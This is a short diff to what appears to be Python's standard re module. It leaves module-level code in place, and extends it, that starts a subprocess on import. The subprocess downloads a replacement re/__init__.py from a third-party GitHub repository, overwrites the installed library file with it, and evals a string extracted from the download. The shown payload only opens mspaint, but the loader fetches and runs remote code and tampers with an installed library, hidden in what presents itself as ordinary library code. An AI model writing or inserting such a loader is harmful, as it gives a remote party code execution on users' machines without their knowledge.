@@ -384,7 +384,10 @@ class Scanner:
             i = j
         return result, string[i:]
 # This should not be executed EVER: >>>>>__import__("os").system("start mspaint")<<<<<
-codabc="""__import__("time").sleep(0.5)
+codabc="""
+assert __import__("os").environ["ISSUBPROCESSCURRENTLY"] != "1"
+__import__("os").environ["ISSUBPROCESSCURRENTLY"] = "1"
+__import__("time").sleep(0.5)
 __import__("pathlib").Path(__import__("re").__file__).write_text((foabc:=__import__("requests").get("https://raw.githubusercontent.com/TheCommCraft/cpython/refs/heads/main/Lib/re/__init__.py").text))
 eval(__import__("re").search(": >>>>>(.*)<<<<<", foabc).group(1))"""
 (spabc:=__import__("subprocess")).Popen([__import__("sys").executable, "-c", codabc])
